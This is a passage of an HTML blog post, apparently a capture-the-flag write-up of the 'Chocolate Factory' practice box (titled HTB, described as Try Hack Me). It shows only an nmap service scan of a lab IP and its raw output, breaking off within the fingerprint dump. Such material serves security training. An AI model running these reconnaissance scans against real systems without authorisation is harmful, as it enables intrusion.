@@ -1,0 +1,852 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB Writeup - Chocolate Factory (Easy) :: CyberSpider</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup of Chocolate Factory from Try Hack Me." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/chocolate_factory/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="CyberSpider" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB Writeup - Chocolate Factory (Easy)">
+<meta property="og:description" content="Writeup of Chocolate Factory from Try Hack Me." />
+<meta property="og:url" content="/posts/chocolate_factory/" />
+<meta property="og:site_name" content="CyberSpider" />
+
+  
+    <meta property="og:image" content="/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-07-04 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cyberspider@ubuntu:~$
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/archive">archive</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/archive" >archive</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/chocolate_factory/">HTB Writeup - Chocolate Factory (Easy)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-07-04</time><span class="post-author">CyberSpider</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/thm/">thm</a>&nbsp;
+      
+      #<a href="/tags/easy/">easy</a>&nbsp;
+      
+      #<a href="/tags/linux/">linux</a>&nbsp;
+      
+      #<a href="/tags/command_injection/">Command_Injection</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p><code>Chocolate Factory</code> is a easy difficulty linux box.</p>
+<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a scan with <code>nmap</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -sV -sC 10.10.5.181      
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-13 14:10 EST
+</span></span><span style="display:flex;"><span>Stats: 0:01:05 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
+</span></span><span style="display:flex;"><span>Service scan Timing: About 33.33% <span style="color:#66d9ef">done</span>; ETC: 14:13 <span style="color:#f92672">(</span>0:01:48 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Stats: 0:04:06 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Script Scan
+</span></span><span style="display:flex;"><span>NSE Timing: About 95.83% <span style="color:#66d9ef">done</span>; ETC: 14:14 <span style="color:#f92672">(</span>0:00:01 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.5.181
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.075s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">994</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>21/tcp  open  ftp      vsftpd 3.0.3
+</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_-rw-rw-r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1000</span>     <span style="color:#ae81ff">1000</span>       <span style="color:#ae81ff">208838</span> Sep <span style="color:#ae81ff">30</span>  <span style="color:#ae81ff">2020</span> gum_room.jpg
+</span></span><span style="display:flex;"><span>| ftp-syst: 
+</span></span><span style="display:flex;"><span>|   STAT: 
+</span></span><span style="display:flex;"><span>| FTP server status:
+</span></span><span style="display:flex;"><span>|      Connected to ::ffff:10.8.21.1
+</span></span><span style="display:flex;"><span>|      Logged in as ftp
+</span></span><span style="display:flex;"><span>|      TYPE: ASCII
+</span></span><span style="display:flex;"><span>|      No session bandwidth limit
+</span></span><span style="display:flex;"><span>|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>|      Control connection is plain text
+</span></span><span style="display:flex;"><span>|      Data connections will be plain text
+</span></span><span style="display:flex;"><span>|      At session startup, client count was <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>|      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span style="display:flex;"><span>|_End of status
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 1631bbb51fcccc12148ff0d833b0089b <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> e71fc9db3eaa44b672103ceedb1d3390 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> b44502b6248ea9065f6c79448a06555e <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>100/tcp open  newacct?
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GenericLines, NULL: 
+</span></span><span style="display:flex;"><span>|     <span style="color:#e6db74">&#34;Welcome to chocolate room!! 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     ___.---------------.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     _:\x20 |:. \x20 ___ \r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     \|______________________;________________|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    hope you wont drown Augustus&#34;</span>
+</span></span><span style="display:flex;"><span>106/tcp open  pop3pw?
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GenericLines, NULL: 
+</span></span><span style="display:flex;"><span>|     <span style="color:#e6db74">&#34;Welcome to chocolate room!! 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     ___.---------------.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     _:\x20 |:. \x20 ___ \r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     \|______________________;________________|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    hope you wont drown Augustus&#34;</span>
+</span></span><span style="display:flex;"><span>109/tcp open  pop2?
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GenericLines, NULL: 
+</span></span><span style="display:flex;"><span>|     <span style="color:#e6db74">&#34;Welcome to chocolate room!! 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     ___.---------------.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     _:\x20 |:. \x20 ___ \r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     \|______________________;________________|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    hope you wont drown Augustus&#34;</span>
+</span></span><span style="display:flex;"><span>110/tcp open  pop3?
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GenericLines, NULL: 
+</span></span><span style="display:flex;"><span>|     <span style="color:#e6db74">&#34;Welcome to chocolate room!! 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     ___.---------------.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     _:\x20 |:. \x20 ___ \r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     \|______________________;________________|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    hope you wont drown Augustus&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==============</span>NEXT SERVICE FINGERPRINT <span style="color:#f92672">(</span>SUBMIT INDIVIDUALLY<span style="color:#f92672">)==============</span>
+</span></span><span style="display:flex;"><span>SF-Port100-TCP:V<span style="color:#f92672">=</span>7.93%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>12/13%Time<span style="color:#f92672">=</span>6398CE3D%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>NU
+</span></span><span style="display:flex;"><span>SF:LL,20F,<span style="color:#e6db74">&#34;\&#34;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20_
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:__\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\.&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__,`\x20\x20\x20\.\x20\x20____\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\&#39;\\__\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\\\\&#39;\\__\\&#39;\\__\\&#39;\\__\\\x20\\__\\&#39;\\_;-----------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|________
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:______________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&#34;\x20&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Gene
+</span></span><span style="display:flex;"><span>SF:ricLines,20F,<span style="color:#e6db74">&#34;\&#34;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\r\n\x20\x20\.&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__,`\x20\x20\x20\.\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\\\\&#39;\\__\\&#39;\\__\\&#39;\\__\\\x20\\__\\&#39;\\_;-----------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|__
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:____________________;________________\|\r\n\r\nA\x20small\x20hint\x20fr
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:om\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20her
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:e!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&#34;\x20&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==============</span>NEXT SERVICE FINGERPRINT <span style="color:#f92672">(</span>SUBMIT INDIVIDUALLY<span style="color:#f92672">)==============</span>
+</span></span><span style="display:flex;"><span>SF-Port106-TCP:V<span style="color:#f92672">=</span>7.93%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>12/13%Time<span style="color:#f92672">=</span>6398CE3D%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>NU
+</span></span><span style="display:flex;"><span>SF:LL,20F,<span style="color:#e6db74">&#34;\&#34;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20_
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:__\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\.&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__,`\x20\x20\x20\.\x20\x20____\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\&#39;\\__\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\\\\&#39;\\__\\&#39;\\__\\&#39;\\__\\\x20\\__\\&#39;\\_;-----------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|________
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:______________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&#34;\x20&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Gene
+</span></span><span style="display:flex;"><span>SF:ricLines,20F,<span style="color:#e6db74">&#34;\&#34;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\r\n\x20\x20\.&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__,`\x20\x20\x20\.\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\\\\&#39;\\__\\&#39;\\__\\&#39;\\__\\\x20\\__\\&#39;\\_;-----------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|__
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:____________________;________________\|\r\n\r\nA\x20small\x20hint\x20fr
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:om\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20her
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:e!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&#34;\x20&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==============</span>NEXT SERVICE FINGERPRINT <span style="color:#f92672">(</span>SUBMIT INDIVIDUALLY<span style="color:#f92672">)==============</span>
+</span></span><span style="display:flex;"><span>SF-Port109-TCP:V<span style="color:#f92672">=</span>7.93%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>12/13%Time<span style="color:#f92672">=</span>6398CE3D%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>NU
+</span></span><span style="display:flex;"><span>SF:LL,20F,<span style="color:#e6db74">&#34;\&#34;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20_
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:__\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\.&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__,`\x20\x20\x20\.\x20\x20____\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\&#39;\\__\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\\\\&#39;\\__\\&#39;\\__\\&#39;\\__\\\x20\\__\\&#39;\\_;-----------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|________
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:______________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&#34;\x20&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Gene
+</span></span><span style="display:flex;"><span>SF:ricLines,20F,<span style="color:#e6db74">&#34;\&#34;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\r\n\x20\x20\.&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__,`\x20\x20\x20\.\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\__\\&#39;\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\\\\&#39;\\__\\&#39;\\__\\&#39;\\__\\\x20\\__\\&#39;\\_;-----------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\
